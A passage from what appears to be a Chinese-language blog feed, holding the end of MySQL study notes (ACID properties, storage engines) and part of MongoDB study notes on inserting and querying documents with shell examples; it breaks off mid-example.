&#x4F7F;&#x53E6;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x589E;&#x6B3E;,&#x8FD9;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;</p><p>&#x4E8B;&#x52A1;&#x7684;&#x56DB;&#x5927;&#x7279;&#x6027;ACID  </p><ol><li>&#x539F;&#x5B50;&#x6027;&#xFF08;Atomicity&#xFF09;&#x4E8B;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x7531;&#x4E00;&#x7CFB;&#x5217;&#x52A8;&#x4F5C;&#x7EC4;&#x6210;&#x3002;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#x786E;&#x4FDD;&#x52A8;&#x4F5C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5B8C;&#x5168;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#x3002; </li><li>&#x4E00;&#x81F4;&#x6027;&#xFF08;Consistency&#xFF09;&#x4E8B;&#x52A1;&#x5728;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x3002;</li><li>&#x9694;&#x79BB;&#x6027;&#xFF08;Isolation&#xFF09;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x4E4B;&#x95F4;&#x65E0;&#x5F71;&#x54CD;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5185;&#x90E8;&#x7684;&#x64CD;&#x4F5C;&#x5BF9;&#x5176;&#x4ED6;&#x4E8B;&#x52A1;&#x662F;&#x4E0D;&#x4EA7;&#x751F;&#x5F71;&#x54CD;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x7EA7;&#x522B;&#x6765;&#x6307;&#x5B9A;&#x9694;&#x79BB;&#x6027;&#x3002;</li><li>&#x6301;&#x4E45;&#x6027;&#xFF08;Durability&#xFF09;&#x4E00;&#x65E6;&#x4E8B;&#x52A1;&#x5B8C;&#x6210;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6539;&#x53D8;&#x5FC5;&#x987B;&#x662F;&#x6301;&#x4E45;&#x5316;&#x7684;&#x3002;</li></ol><p>&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;      show engines;<br>&#x521B;&#x5EFA;&#x8868;&#x6307;&#x5B9A;&#x5B58;&#x50A8;&#x5F15;&#x64CE;      create table tbname (id int,name char(20),age int) engine=myisam;<br>&#x67E5;&#x770B;&#x8868;&#x7684;&#x5C5E;&#x6027;    use dbname; show table status where name=&#x2019;tbname&#x2019;;   </p><h2 id="&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;"><a href="#&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;" class="headerlink" title="&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;"></a>&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;</h2><p>&#x4E3A;&#x4E86;&#x5B66;&#x4E60;&#x66F4;&#x591A;&#x7684;MySQL&#x77E5;&#x8BC6;,&#x8BF7;&#x8BBF;&#x95EE;MySQL&#x5B98;&#x7F51; <a href="https://www.mysql.com/" target="_blank" rel="noopener">https://www.mysql.com/</a></p><h2 id="&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;"><a href="#&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;"></a>&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;</h2><p>MySQL &#x62E5;&#x6709;&#x5E9E;&#x5927;&#x7684;&#x7528;&#x6237;&#x7FA4;,&#x56FD;&#x5916;&#x7684;&#x6709; Facebook&#x3001;Flickr&#x3001;eBay &#x7B49;,&#x56FD;&#x5185;&#x7684;&#x6709;&#x963F;&#x91CC;&#x3001;&#x817E;&#x8BAF;&#x3001;&#x65B0;&#x6D6A;&#x3001;&#x767E;&#x5EA6;&#x7B49;&#x3002;&#x800C;&#x8FD9;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x548C;&#x5927;&#x90E8;&#x5206;&#x4F20;&#x7EDF;&#x516C;&#x53F8;&#x7684;&#x670D;&#x52A1;&#x9700;&#x8981;7&#xD7;24&#x5C0F;&#x65F6;&#x8FDE;&#x7EED;&#x5DE5;&#x4F5C;&#x3002;&#x5F53;&#x6B64;&#x7C7B;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x90E8;&#x5206;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x5C31;&#x9700;&#x8981;&#x9AD8;&#x53EF;&#x7528;&#x6280;&#x672F;&#x5C06;&#x6D41;&#x91CF;&#x7275;&#x5F15;&#x81F3;&#x5907;&#x4EFD;&#x4E3B;&#x673A;,&#x4ECE;&#x800C;&#x6B64;&#x65F6;&#x8FD9;&#x4E9B;&#x516C;&#x53F8;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5907;&#x4EFD;&#x548C;&#x6062;&#x590D;&#x624B;&#x6BB5;&#x6765;&#x4EA7;&#x751F;&#x5907;&#x673A;,&#x5E76;&#x901A;&#x8FC7;&#x590D;&#x5236;&#x6765;&#x540C;&#x6B65;&#x4E3B;&#x5907;&#x673A;&#x95F4;&#x7684;&#x72B6;&#x6001;,&#x540C;&#x65F6;&#x90E8;&#x7F72;&#x5404;&#x79CD;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x6765;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x72B6;&#x6001;&#x3002;&#x5F53;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x901A;&#x8FC7;&#x624B;&#x5DE5;&#x6216;&#x81EA;&#x52A8;&#x5316;&#x624B;&#x6BB5;&#x5C06;&#x4E3B;&#x673A;&#x6D41;&#x91CF;&#x5207;&#x6362;&#x81F3;&#x5907;&#x673A;,&#x8FD9;&#x4E2A;&#x52A8;&#x4F5C;&#x53EB;&#x4F5C;failover&#x3002;&#x800C;&#x4E00;&#x4E9B;&#x5927;&#x578B;&#x516C;&#x53F8;&#x5728;&#x9762;&#x5BF9;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x53F0; MySQL &#x670D;&#x52A1;&#x5668;&#x65F6;,&#x901A;&#x5E38;&#x4F7F;&#x7528;<code>&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x811A;&#x672C;</code>&#x6216;&#x7A0B;&#x5E8F;&#x5B8C;&#x6210;&#x4E0A;&#x8FF0;&#x79CD;&#x79CD;&#x52A8;&#x4F5C;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x4E00;&amp;#x3001;SQL&amp;#x8BED;&amp;#x53E5;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#x3001;SQL&amp;#x8BED;&amp;#x53E5;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x4E00;&amp;#x3001;SQL&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB学习笔记</title>
    <link href="https://marnm.github.io//posts/a36562d7/"/>
    <id>https://marnm.github.io//posts/a36562d7/</id>
    <published>2022-06-07T04:43:09.000Z</published>
    <updated>2022-06-07T05:17:01.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><a href="#&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"></a>&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;</h2><pre><code># mongoMongoDB shell version v3.6.13connecting to: test&gt; </code></pre><p>&#x9ED8;&#x8BA4;shell&#x8FDE;&#x63A5;&#x7684;&#x662F;&#x672C;&#x673A;localhost&#xFF0C;<code>nonnecting to:</code>&#x663E;&#x793A;&#x4F60;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#xFF0C;&#x2019;test&#x2019;&#x662F;MongoDB&#x7684;&#x9ED8;&#x8BA4;&#x5E93;&#xFF0C;&#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>use &apos;dbName&apos;</code>&#x547D;&#x4EE4;</p><h2 id="&#x63D2;&#x5165;&#x8BB0;&#x5F55;"><a href="#&#x63D2;&#x5165;&#x8BB0;&#x5F55;" class="headerlink" title="&#x63D2;&#x5165;&#x8BB0;&#x5F55;"></a>&#x63D2;&#x5165;&#x8BB0;&#x5F55;</h2><pre><code>&gt; j = {name:&quot;mongo&quot;};{ &quot;name&quot; : &quot;mongo&quot; }&gt; t={x:3}{ &quot;x&quot; : 3 }&gt; db.things.save(j)WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.things.save(t)WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.things.find(){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }</code></pre><ul><li>&#x4E0D;&#x9700;&#x8981;&#x9884;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#xFF0C;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#x5019;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA;.</li><li>&#x5728;&#x6587;&#x6863;&#x6C47;&#x603B;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x4EFB;&#x4F55;&#x7ED3;&#x6784;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x7136;&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x6211;&#x4EEC;&#x5B58;&#x50A8;&#x7684;&#x8FD8;&#x662F;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#x6587;&#x6863;&#x7684;&#x96C6;&#x5408;</li><li>&#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x96C6;&#x5408;&#x4E2D;&#x90FD;&#x4F1A;&#x6709; &#x4E00;&#x4E2A;ID&#xFF0C;&#x540D;&#x5B57;&#x53EB;<code>_id</code>.</li></ul><p><strong>&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x63D2;&#x5165;</strong><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)db.c2.insert({<span class="attr">name</span>:<span class="string">&quot;user&quot;</span>+i, <span class="attr">age</span>:<span class="number">18</span>+i})</span><br><span class="line">WriteResult({ <span class="string">&quot;nInserted&quot;</span> : <span class="number">1</span> })</span><br><span class="line">&gt; db.c2.find()</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ab&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user1&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">19</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ac&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user2&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">20</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ad&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user3&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">21</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97ae&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user4&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">22</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97af&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user5&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">23</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b0&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user6&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">24</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b1&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user7&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">25</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b2&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user8&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">26</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b3&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user9&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">27</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627fd46019fb40ff16ec97b4&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;user10&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">28</span> }</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="id-key"><a href="#id-key" class="headerlink" title="_id key"></a><code>_id</code> key</h2><p>MongoDB&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E2D;&#xFF0C;<code>_id</code>&#x662F;&#x5176;&#x81EA;&#x6709;&#x4EA7;&#x7269;&#x3002;</p><p>&#x5B58;&#x50A8;&#x5728;MongoDB&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x6587;&#x6863;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x7684;<strong>&#x4E3B;&#x952E;</strong> <code>_id</code> &#xFF0C; &#x8FD9;&#x4E2A;&#x4E3B;&#x952E;&#x540D;&#x79F0;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x662F;MongoDB&#x652F;&#x6301;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;<code>ObjectId</code>&#x3002;</p><p>_id key &#x4E3E;&#x4F8B;&#x8BF4;&#x660E;</p><pre><code> db.test.find(){ &quot;_id&quot; : ObjectId(&quot;627d3ef6de66cb02cb45d3e1&quot;), &quot;name&quot; : &quot;zhangya&quot;, &quot;age&quot; : &quot;21&quot;, &quot;addr&quot; : &quot;&#x5317;&#x4EAC;&#x5E02;&#x671D;&#x9633;&#x533A;&quot; }{ &quot;_id&quot; : ObjectId(&quot;627d3fffde66cb02cb45d3e2&quot;), &quot;name&quot; : &quot;zhang3&quot;, &quot;age&quot; : &quot;24&quot;, &quot;addr&quot; : &quot;&#x4E0A;&#x6D77;&#x6D66;&#x4E1C;&#x533A;&quot; }&gt;</code></pre><p>&#x5728;MongoDB&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x90FD;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x53EB;&#x505A;<strong>_id</strong>&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5B57;&#x6BB5;&#x7684;&#x9ED8;&#x8BA4;&#x7C7B;&#x578B;&#x662F;ObjectId&#xFF0C;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;ObjectId&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p><code>db.collection.insert</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.things.insert({<span class="attr">_id</span>:<span class="number">3</span>,<span class="attr">name</span>:<span class="string">&quot;Bill&quot;</span>,<span class="attr">age</span>:<span class="number">34</span>})</span><br><span class="line">&gt; db.things.find()</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e124b7e83be0e107f69&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6b&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">2</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6c&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6d&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">4</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6e&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">5</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6f&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">6</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f70&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">7</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f71&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">8</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f72&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">9</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="number">3</span>, <span class="string">&quot;name&quot;</span> : <span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;age&quot;</span> : <span class="number">34</span> }</span><br></pre></td></tr></tbody></table></figure><p>&#xFF01;&#x867D;&#x7136;<strong>_id</strong> &#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x6307;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x4E2D;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5982;&#x679C;&#x63D2;&#x5165;&#x91CD;&#x590D;&#x503C;&#x7684;&#x8BDD;&#x7CFB;&#x7EDF;&#x5C06;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;</p><p><code>db.collection.insertOne()</code><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.test.insertOne({<span class="attr">name</span>:<span class="string">&quot;fnaichu&quot;</span>, <span class="attr">age</span>: <span class="number">24</span>})</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;acknowledged&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;insertedId&quot;</span> : ObjectId(<span class="string">&quot;627f80462c1c696497b0e31e&quot;</span>)</span><br><span class="line">}</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>db.collection.insertMany()</code><br></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.test.insertMany([</span><br><span class="line">... {<span class="attr">name</span>:<span class="string">&quot;li4&quot;</span>, <span class="attr">age</span>: <span class="number">35</span>, <span class="attr">addr</span>:<span class="string">&quot;&#x5E7F;&#x5DDE;&#x5E02;&quot;</span>},</span><br><span class="line">... {<span class="attr">name</span>:<span class="string">&quot;wang5&quot;</span>, <span class="attr">age</span>: <span class="number">42</span>, <span class="attr">addr</span>:<span class="string">&quot;&#x5357;&#x4EAC;&#x5E02;&quot;</span>},</span><br><span class="line">... {<span class="attr">name</span>:<span class="string">&quot;qiang7&quot;</span>, <span class="attr">age</span>: <span class="number">28</span>, <span class="attr">addr</span>:<span class="string">&quot;&#x4E0A;&#x6D77;&#x5E02;&quot;</span>}])</span><br><span class="line">{</span><br><span class="line">        <span class="string">&quot;acknowledged&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;insertedIds&quot;</span> : [</span><br><span class="line">                ObjectId(<span class="string">&quot;627f82648f2637720618c4f4&quot;</span>),</span><br><span class="line">                ObjectId(<span class="string">&quot;627f82648f2637720618c4f5&quot;</span>),</span><br><span class="line">                ObjectId(<span class="string">&quot;627f82648f2637720618c4f6&quot;</span>)</span><br><span class="line">        ]</span><br><span class="line">}</span><br><span class="line">&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><hr><h2 id="&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;"><a href="#&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;" class="headerlink" title="&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;"></a>&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;</h2><h3 id="&#x666E;&#x901A;&#x67E5;&#x8BE2;"><a href="#&#x666E;&#x901A;&#x67E5;&#x8BE2;" class="headerlink" title="&#x666E;&#x901A;&#x67E5;&#x8BE2;"></a>&#x666E;&#x901A;&#x67E5;&#x8BE2;</h3><p>&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x901A;&#x8FC7;<code>find()</code>&#x6765;&#x67E5;&#x8BE2;&#xFF0C;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x7ED3;&#x6784;&#x7684;&#x96C6;&#x5408;</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">var</span> cursor=db.things.find()</span><br><span class="line">&gt; <span class="keyword">while</span>(cursor.hasNext()) printjson(cursor.next())</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e064b7e83be0e107f68&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;mongo&quot;</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e7e124b7e83be0e107f69&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6a&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">1</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6b&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">2</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6c&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">3</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6d&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">4</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6e&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">5</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f6f&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">6</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f70&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">7</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f71&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">8</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;627e811d4b7e83be0e107f72&quot;</span>), <span class="string">&quot;x&quot;</span> : <span class="number">4</span>, <span class="string">&quot;j&quot;</span> : <span class="number">9</span> }</span><br><span class="line">{ <span class="string">&quot;_id&quot;</span> : <span class="number">3</span>, <span 